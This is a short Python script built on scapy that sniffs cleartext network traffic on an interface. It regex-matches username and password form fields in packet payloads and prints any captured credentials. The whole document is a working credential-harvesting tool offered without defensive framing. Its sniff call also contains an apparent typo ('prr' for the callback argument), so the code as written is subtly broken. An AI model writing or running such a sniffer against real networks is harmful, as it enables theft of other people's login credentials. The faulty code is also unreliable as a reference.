from scapy.all import *
from urllib import parse
import re

iface = "eth0"

def get_login_pass(body):
    user = None
    passwd = None

    userfields = ['email','userfield','login_id','login_id','account','sign_in','session_key','id','uid','uname','username','log','login','wpname','ahd_username','unickname','nickname','user','alias','psweudo','uname','name','userfield']
    passfields = ['password','passwrd','passwords','pass','passwd','session_password','pwd','login_password','wppassword','loginpassword']


    for login in userfields:
        login_re = re.search("(%s=[^&]+)" % login, body, re.IGNORECASE) #we can search in reg site
        if login_re:
            user = login_re.group()

    for passfield in passfields:
        pass_re = re.search("(%s=[^&]+)" % passfield, body, re.IGNORECASE)

        if pass_re:
            passwd = pass_re.group()

    if user and passwd:
        return(user, passwd)

def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        pass

try:
    sniff(iface=iface, prr=pkt_parser, store=0)
except KeyboardInterrupt:
    print("Exiting")
    exit(0)